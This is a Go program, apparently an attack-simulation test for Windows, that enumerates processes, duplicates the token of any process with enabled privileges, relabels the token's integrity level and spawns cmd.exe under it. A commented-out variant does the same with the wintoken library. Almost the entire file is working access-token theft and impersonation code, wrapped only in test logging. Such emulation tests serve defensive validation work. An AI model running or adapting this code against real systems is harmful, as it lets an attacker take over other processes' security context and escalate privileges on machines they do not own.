package main

import (
	"fmt"
	"helpers"
	"os"
	"strconv"
	"unsafe"

	"golang.org/x/sys/windows"
)

func CheckPrivilegeEnabled(pidToDuplicate uint32, nameOfLogFile string, nameOfTest string) (bool, error) {
	var tokenHandle windows.Token

	proc, err := windows.OpenProcess(uint32(windows.PROCESS_QUERY_LIMITED_INFORMATION), false, pidToDuplicate)
	if err != nil {
		return false, fmt.Errorf("OpenProcess failed: %v", err)
	}

	err = windows.OpenProcessToken(proc, windows.TOKEN_QUERY, &tokenHandle)
	if err != nil {
		return false, fmt.Errorf("OpenProcessToken failed: %v", err)
	}
	defer windows.CloseHandle(windows.Handle(tokenHandle))

	var privileges windows.Tokenprivileges
	var returnLength uint32
	err = windows.GetTokenInformation(tokenHandle, windows.TokenPrivileges, nil, 0, &returnLength)
	if err != nil && err != windows.ERROR_INSUFFICIENT_BUFFER {
		helpers.WriteLog(nameOfLogFile, err.Error(), 1, nameOfTest)
	}
	buffer := make([]byte, returnLength)
	err = windows.GetTokenInformation(tokenHandle, windows.TokenPrivileges, &buffer[0], returnLength, &returnLength)
	if err != nil {
		helpers.WriteLog(nameOfLogFile, err.Error(), 1, nameOfTest)
	}
	privileges = *(*windows.Tokenprivileges)(unsafe.Pointer(&buffer[0]))

	for _, priv := range privileges.Privileges {
		if priv.Attributes&windows.SE_PRIVILEGE_ENABLED != 0 {
			return true, nil
		}
	}
	return false, nil
}

const (
	TokenQuery                    = 0x0008
	TokenAdjustDefault            = 0x0080
	TokenAdjustIntegrity          = 0x0200
	SECURITY_MANDATORY_MEDIUM_RID = 0x00002000
)

type TOKEN_MANDATORY_LABEL struct {
	Label windows.SIDAndAttributes
}

func main() {
	var nameOfLogFile string
	if len(os.Args) == 2 {
		nameOfLogFile = os.Args[1]
	} else {
		nameOfLogFile = helpers.CreateLogFileIfItDoesNotExist("./", "PrivilegeEscalation", "PrivilegeEscalation")
	}

	helpers.WriteLog(nameOfLogFile, "Starting Test: ManipulateAccessToken", 2, "PrivilegeEscalation")
	kernel := windows.NewLazyDLL("advapi32.dll")
	setTok := kernel.NewProc("SetTokenInformation")
	newProc := kernel.NewProc("CreateProcessWithTokenW")

	const maxProcesses = 1024
	var processes [maxProcesses]uint32
	var needed uint32
	if err := windows.EnumProcesses(processes[:], &needed); err != nil {
		fmt.Println(err)
	}
	numProcesses := needed / 4
	procs := processes[:numProcesses]
	var pidToDup []uint32
	for i := 0; i < len(procs); i++ {
		if res, err := CheckPrivilegeEnabled(procs[i], nameOfLogFile, "PrivilegeEscalation"); err == nil {
			if res {
				pidToDup = append(pidToDup, procs[i])
			}
		}
	}
	for i := 0; i < len(pidToDup); i++ {
		handle1, err := windows.OpenProcess(uint32(windows.PROCESS_QUERY_LIMITED_INFORMATION), false, uint32(pidToDup[i]))
		if err != nil {
			helpers.WriteLog(nameOfLogFile, err.Error(), 1, "PrivilegeEscalation")
		}

		var tokTarg, dupTokHand windows.Token
		err = windows.OpenProcessToken(handle1, uint32(windows.TOKEN_DUPLICATE), &tokTarg)
		if err != nil {
			helpers.WriteLog(nameOfLogFile, err.Error(), 1, "PrivilegeEscalation")
		}

		err = windows.DuplicateTokenEx(tokTarg, windows.TOKEN_ADJUST_DEFAULT|windows.TOKEN_QUERY|windows.TOKEN_ADJUST_SESSIONID|windows.TOKEN_DUPLICATE|windows.TOKEN_ASSIGN_PRIMARY, nil, windows.SecurityImpersonation, windows.TokenPrimary, &dupTokHand)
		if err != nil {
			helpers.WriteLog(nameOfLogFile, err.Error(), 1, "PrivilegeEscalation")
		}

		var tml TOKEN_MANDATORY_LABEL
		var sid = new(windows.SID)
		windows.ConvertStringSidToSid(windows.StringToUTF16Ptr("S-1-16-8192"), &sid)
		tml.Label.Sid = sid
		tml.Label.Attributes = windows.SE_GROUP_INTEGRITY

		_, _, err = setTok.Call(uintptr(dupTokHand), windows.TokenIntegrityLevel, uintptr(unsafe.Pointer(&tml)), uintptr(unsafe.Sizeof(tml)))
		if err != nil {
			if err.Error() != "The operation completed successfully." {
				helpers.WriteLog(nameOfLogFile, err.Error()+" from pid "+strconv.Itoa(int(pidToDup[i]))+" ", 1, "PrivilegeEscalation")
				continue
			}
		}

		var startInfo windows.StartupInfo
		var procInfo windows.ProcessInformation

		_, _, err = newProc.Call(uintptr(dupTokHand), 0, uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("cmd.exe"))), 0, 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&startInfo)), uintptr(unsafe.Pointer(&procInfo)))
		if err != nil {
			helpers.WriteLog(nameOfLogFile, err.Error()+" from pid "+strconv.Itoa(int(pidToDup[i]))+" ", 1, "PrivilegeEscalation")
		} else {
			os.Exit(0)
		}
	}
	helpers.WriteLog(nameOfLogFile, "Ending Test: ManipulateAccessToken", 2, "PrivilegeEscalation")
	os.Exit(1)
}

/*package main

import (
	"fmt"
	"github.com/fourcorelabs/wintoken"
	"os/exec"
	"syscall"
)

func main() {
	tok, err := wintoken.OpenProcessToken(6928, wintoken.TokenPrimary)
	if err != nil {
		fmt.Println(err.Error())
	}

	fmt.Println(tok.GetPrivileges())
	cmd := exec.Command("cmd.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{Token: syscall.Token(tok.Token())}
	err = cmd.Run()
	fmt.Println(err)
}*/
